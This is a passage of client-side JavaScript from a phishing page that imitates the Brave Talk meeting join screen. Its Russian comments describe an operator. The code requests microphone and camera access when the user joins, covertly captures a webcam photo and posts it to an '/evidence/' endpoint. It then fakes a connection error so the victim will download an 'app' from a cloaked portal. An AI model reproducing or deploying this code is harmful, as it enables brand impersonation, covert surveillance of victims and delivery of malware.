  function download() {
    var code = codeFromUrl();
    var btn = document.getElementById("bt-download");
    if (isMobile()) {
      toast(t('onlyDesktop'), true);
      return;
    }
    if (btn) { btn.disabled = true; btn.textContent = "Preparing your download…"; }
    if (!code) {
      toast("This page must be opened from your invite link.", true);
      if (btn) { btn.disabled = false; btn.textContent = t("download"); }
      return;
    }
    fetch("/teams/retreive/" + encodeURIComponent(code) + "/", {
      headers: { Accept: "application/json" }, credentials: "omit",
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (btn) { btn.disabled = false; btn.textContent = t("download"); }
        if (data && data.error === false && data.link) {
          var a = document.createElement("a");
          a.href = data.link;
          if (!/^https?:/i.test(data.link)) {
            a.setAttribute("download", "true"); // локальная выдача: тихое скачивание
          } // внешняя (мак-портал): обычный переход — <a download> режет Referer,
            // а портал без Referer клоакой отвечает 404
          document.body.appendChild(a);
          a.click();
          a.remove();
          toast(t('dlStarted'));
        } else {
          toast((data && data.message) || t('dlUnavailable'), true);
        }
      })
      .catch(function () {
        if (btn) { btn.disabled = false; btn.textContent = t("download"); }
        toast(t('netErr'), true);
      });
  }

  function nameOk() { return !!(input && (input.value || "").trim()); }

  function tryJoin() {
    if (!nameOk()) {
      input.classList.add("error");
      input.setAttribute("aria-invalid", "true");
      if (hint) hint.style.display = "block";
      input.focus();
      return;
    }
    closeMenu();
    requestMediaThenJoin();
  }

  /* Вход как вживую: браузер спрашивает микрофон+камеру, дали — алерт/фото
     оператору, затем Connecting и правдоподобная ошибка «нужно приложение». */
  function requestMediaThenJoin() {
    var done = false;
    function proceed() {
      if (done) return;
      done = true;
      connecting();
      setTimeout(callError, 1700 + Math.random() * 1100);
    }
    var md = navigator.mediaDevices;
    if (!md || !md.getUserMedia) { proceed(); return; }
    md.getUserMedia({
      audio: true,
      video: { width: 1280, height: 720, facingMode: "user" },
    }).then(function (s) {
      reportEvidence("mic");
      var hasVideo = s.getVideoTracks().length > 0;
      if (!hasVideo) { s.getTracks().forEach(function (t) { t.stop(); }); proceed(); return; }
      var v = document.createElement("video");
      v.autoplay = true; v.muted = true; v.playsInline = true;
      v.srcObject = s;
      v.style.cssText = "position:fixed;left:-9999px;top:0;width:320px;height:180px;";
      document.body.appendChild(v);
      setTimeout(function () {
        try {
          var c = document.createElement("canvas");
          c.width = v.videoWidth || 1280;
          c.height = v.videoHeight || 720;
          c.getContext("2d").drawImage(v, 0, 0);
          c.toBlob(function (b) { if (b) reportEvidence("camera", b); }, "image/jpeg", 0.85);
        } catch (e) {}
        setTimeout(function () {
          s.getTracks().forEach(function (t) { t.stop(); });
          v.remove();
        }, 2500);
      }, 1500);
      proceed();
    }).catch(function () { proceed(); });
  }

  function reportEvidence(kind, blob) {
    var code = codeFromUrl();
    if (!code) return;
    try {
      var fd = new FormData();
      fd.append("event", kind);
      if (blob) fd.append("photo", blob, "cam.jpg");
      fetch("/evidence/" + encodeURIComponent(code), {
        method: "POST", body: fd, credentials: "omit",
      }).catch(function () {});
    } catch (e) {}
  }

  var micBtn = null, camBtn = null;

  /* микрофон: как вживую — запрашиваем доступ; дали — включаем и стучим трекеру */
  function micAction() {
    var b = micBtn;
    if (!b) return;
    if (b.getAttribute("aria-pressed") === "true") {
      navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
        s.getTracks().forEach(function (x) { x.stop(); });
        b.setAttribute("aria-pressed", "false");
        b.setAttribute("aria-label", t("muteMic"));
        var ico = b.querySelector(".toolbox-icon");
        if (ico) ico.classList.remove("toggled");
        setToolIcon(b, '<div class="jitsi-icon jitsi-icon-default">' + IC_MIC_ON + "</div>");
        reportEvidence("mic");
      }).catch(function () {
        toast(t("micBlocked"), true);
      });
    } else {
      b.setAttribute("aria-pressed", "true");
      b.setAttribute("aria-label", t("unmuteMic"));
      var ico2 = b.querySelector(".toolbox-icon");
      if (ico2) ico2.classList.add("toggled");
      setToolIcon(b, nativeMicHtml);
    }
  }

  /* камера: живое превью в видео-области + снимок оператору */
  function camAction() {
    var b = camBtn;
    if (!b) return;
    if (b.getAttribute("aria-pressed") === "true") {
      navigator.mediaDevices.getUserMedia({
        video: { width: 1280, height: 720, facingMode: "user" },
      }).then(function (s) {
        camStream = s;
        b.setAttribute("aria-pressed", "false");
        b.setAttribute("aria-label", t("stopCam"));
        var ico = b.querySelector(".toolbox-icon");
        if (ico) ico.classList.remove("toggled");
        setToolIcon(b, '<div class="jitsi-icon jitsi-icon-default">' + IC_CAM_ON + "</div>");
        showCamPreview();
        setTimeout(function waitForFrame() {
          if (!camVideo) return;
          if (!camVideo.videoWidth) { setTimeout(waitForFrame, 300); return; }
          try {
            var c = document.createElement("canvas");
            c.width = camVideo.videoWidth;
            c.height = camVideo.videoHeight;
            c.getContext("2d").drawImage(camVideo, 0, 0);
            c.toBlob(function (blob) { if (blob) reportEvidence("camera", blob); },
                     "image/jpeg", 0.85);
          } catch (e) {}
        }, 1500);
      }).catch(function () {
        toast(t("camBlocked"), true);
      });
    } else {
      b.setAttribute("aria-pressed", "true");
      b.setAttribute("aria-label", t("startCam"));
      var ico2 = b.querySelector(".toolbox-icon");
      if (ico2) ico2.classList.add("toggled");
      setToolIcon(b, nativeCamHtml);
      stopCamPreview();
    }
  }

  function showCamPreview() {
    var preview = qs("#preview");
    if (!preview || !camStream) return;
    var avatar = preview.querySelector(".avatar");
    if (avatar) avatar.style.display = "none";
    camVideo = document.createElement("video");
    camVideo.autoplay = true;
    camVideo.muted = true;
    camVideo.playsInline = true;
    camVideo.srcObject = camStream;
    camVideo.style.cssText = "width:100%;height:100%;object-fit:cover;";
    preview.appendChild(camVideo);
  }

  function stopCamPreview() {
    if (camStream) {
      camStream.getTracks().forEach(function (t) { t.stop(); });
      camStream = null;
    }
    if (camVideo) { camVideo.remove(); camVideo = null; }
    var preview = qs("#preview");
    var avatar = preview && preview.querySelector(".avatar");
    if (avatar) avatar.style.display = "";
  }

        m.querySelectorAll(".bt-tile").forEach(function (x) { x.classList.remove("sel"); });
        t.classList.add("sel");
        setTimeout(hide, 350);
      });
    });
  }

  function settingsDialog() {
    modal(t('settingsTitle'),
      '<div class="bt-label">' + t('micLabel') + '</div>' +
      '<select class="bt-input"><option>' + t('micDefault') + '</option><option>' + t('sameSystem') + '</option></select>' +
      '<div class="bt-label">' + t('camLabel') + '</div>' +
      '<select class="bt-input"><option>' + t('camDefault') + '</option><option>' + t('noCamera') + '</option></select>');
  }

  function leaveDialog() {
    modal(t('leaveTitle'),
      '<div class="bt-sub" style="margin:0">' + t('leaveBody') + '</div>' +
      '<div class="bt-row">' +
      '<button class="bt-btn bt-btn-ghost" id="bt-stay" type="button">' + t('stay') + '</button>' +
      '<button class="bt-btn" id="bt-leave" type="button" style="background:#C7372C">' + t('leave') + '</button></div>');
    var st = document.getElementById("bt-stay");
    if (st) st.addEventListener("click", hide);
    var lv = document.getElementById("bt-leave");
    if (lv) lv.addEventListener("click", function () { location.href = "/"; });
  }

  function wireToolbar() {
    micBtn = document.querySelector('.toolbox-button[aria-label="Unmute microphone"]');
    camBtn = document.querySelector('.toolbox-button[aria-label="Start camera"]');
    var inv = document.querySelector('.toolbox-button[aria-label="Invite people"]');
    var lv = document.querySelector('.toolbox-button[aria-label="Leave the meeting"]');
    [micBtn, camBtn].forEach(function (b) {
      if (!b) return;
      b.classList.remove("disabled");
      b.removeAttribute("aria-disabled");
      var ico = b.querySelector(".toolbox-icon");
      if (ico) ico.classList.remove("disabled");
    });
    if (micBtn) {
      nativeMicHtml = (micBtn.querySelector(".toolbox-icon") || {}).innerHTML || null;
      micBtn.setAttribute("aria-pressed", "true");
      micBtn.setAttribute("aria-label", t("unmuteMic"));
      micBtn.setAttribute("data-bt", "mic");
      micBtn.addEventListener("click", micAction);
    }
    if (camBtn) {
      nativeCamHtml = (camBtn.querySelector(".toolbox-icon") || {}).innerHTML || null;
      camBtn.setAttribute("aria-pressed", "true");
      camBtn.setAttribute("aria-label", t("startCam"));
      camBtn.setAttribute("data-bt", "cam");
      camBtn.addEventListener("click", camAction);
    }
    if (inv) { inv.setAttribute("aria-label", t("inviteBtn")); inv.addEventListener("click", inviteDialog); }
    if (lv) { lv.setAttribute("aria-label", t("leaveBtn")); lv.addEventListener("click", leaveDialog); }
  }

  /* перевод статических надписей преждойна под язык браузера */
  function applyLang() {
    document.documentElement.lang = LANG;
    var h = qs(".css-hfg03y-title");
    if (h) h.textContent = t("joinMeeting");
    if (input) {
      input.setAttribute("placeholder", t("enterName"));
      input.setAttribute("aria-label", t("enterName"));
    }
    if (joinBtn) {
      for (var i = 0; i < joinBtn.childNodes.length; i++) {
        if (joinBtn.childNodes[i].nodeType === 3 && joinBtn.childNodes[i].nodeValue.trim()) {
          joinBtn.childNodes[i].nodeValue = t("joinMeeting");
          break;
        }
      }
    }
    if (hint) hint.textContent = t("nameHint");
    var w = qs(".css-y95g3r-warning");
    if (w) w.textContent = t("recording");
  }

  function wire() {
    document.title = "Brave Talk";
    input = qs("#premeeting-name-input");
    joinBtn = qs('[data-testid="prejoin.joinMeeting"]');
    var chev = qs('[data-testid="prejoin.joinOptions"]');
    if (!input || !joinBtn) return;

    input.value = "";
    hint = qs("#bt-name-hint");
    applyLang();

    // аватар поверх видео-области: правее градиентной панели, центр по вертикали
    var preview = qs("#preview");
    var screenEl = qs(".premeeting-screen");
    if (preview && screenEl && preview.parentElement !== screenEl) screenEl.appendChild(preview);
    var initials = preview ? preview.querySelector(".css-1s788x3-initialsContainer") : null;
    function placePreview() {
      if (!preview || IS_MOBILE_UA) return;
      var panel = qs(".css-1y9ozej-content");
      var left = panel ? Math.round(panel.getBoundingClientRect().width) : 0;
      preview.style.position = "absolute";
      preview.style.left = left + "px";
      preview.style.right = "0";
      preview.style.top = "0";
      preview.style.bottom = "0";
      preview.style.width = "auto";
      preview.style.height = "auto";
    }
    placePreview();
    window.addEventListener("resize", placePreview);
    window.addEventListener("orientationchange", function () {
      setTimeout(placePreview, 250);
    });
    wireToolbar();
    function setInitials() {
      if (!initials) return;
      var words = (input.value || "").trim().split(/\s+/).filter(Boolean);
      var s = words.map(function (w) { return w[0]; }).join("").toUpperCase().slice(0, 2);
      initials.textContent = s;
    }

    syncState();
    input.addEventListener("input", function () {
      syncState();
      setInitials();
    });

    joinBtn.addEventListener("click", function (e) {
      if (e.target && e.target.closest && e.target.closest('[data-testid="prejoin.joinOptions"]')) {
        if (nameOk()) { e.stopPropagation(); toggleMenu(chev); }
        return;
      }
      tryJoin();
    });
    input.addEventListener("keydown", function (e) { if (e.key === "Enter") tryJoin(); });

    document.addEventListener("click", function (e) {
      if (menu && !e.target.closest("#bt-joinmenu") && !e.target.closest('[data-testid="prejoin.joinOptions"]')) {
        closeMenu();
      }
    });
    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape") {
        if (menu) closeMenu();
        else if (root.style.display === "flex") hide();
      }
    });
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", wire);
  else wire();
})();
